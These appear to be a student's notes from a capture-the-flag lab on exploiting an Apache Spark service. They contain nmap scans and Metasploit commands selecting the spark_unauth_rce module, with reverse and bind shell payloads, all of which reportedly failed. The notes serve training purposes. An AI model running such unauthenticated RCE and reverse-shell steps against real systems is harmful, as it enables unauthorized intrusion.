# Metasploit

Start 15:23


## Finding out about target

**Info**
c80e8a25-461a-4806-aff6-72ae677f72e4.rdocker.vuln.land
ip: 152.96.15.17 -> started twice later ip is 	152.96.15.8 (might be mixecd up)
port 8081

	152.96.15.8

**Find services**
- `nmap -sV -PN -n 152.96.15.8`
   - Pn: skip host discoversy, n: disable dns resolution
   - sV: Service detection
Result: 
Nmap scan report for 152.96.15.17
Host is up (0.0040s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
6123/tcp open  spark            Apache Spark
8081/tcp open  blackice-icecap?



run with default scripts `nmap -sC -PN -n 152.96.15.8` (resul not as relevant)
PORT     STATE SERVICE
8081/tcp open  blackice-icecap


## Metasploit 
- `msfconsole` start metasploit
- `search spark`  (remark search for blackice-icecap didnt return any values)
    - 4 results
- `use exploit/linux/http/spark_unauth_rce` i choose first because a) excellent b) rank 0 c) seems to do what I want
    - `options` to see options that has to be configured: RHOST, RPORT
    - `show payloads` -> varios options
- Configre options
    - `set RHOSTS 152.96.15.8`
    - `set RPORT 6123`
- Configure and exploit with payloads
    - Tried multiple payloads
    - `set PAYLOAD payload/generic/shell_bind_aws_ssm` > failed
    - `set PAYLOAD payload/generic/shell_bind_tcp` > failed
    - `set PAYLOAD payload/generic/shell_reverse_tcp` > failed
    - `set PAYLOAD payload/java/jsp_shell_reverse_tcp ` > failed
    - `set PAYLOAD payload/multi/meterpreter/reverse_http` > failed
    - `set PAYLOAD payload/java/shell_reverse_tcp` > failed
    -> run exploit `exploit`

all failed :-(
*Remark: I think reverse shell would have been the most promising but also didnt work (VNP etc. was running)*

Next step would have been to use the shell (which would have been the result of the exploit) and then to get the flag via `cat /flag/flag.txt`

I could try other metasploit attacks as well (or this one with different config)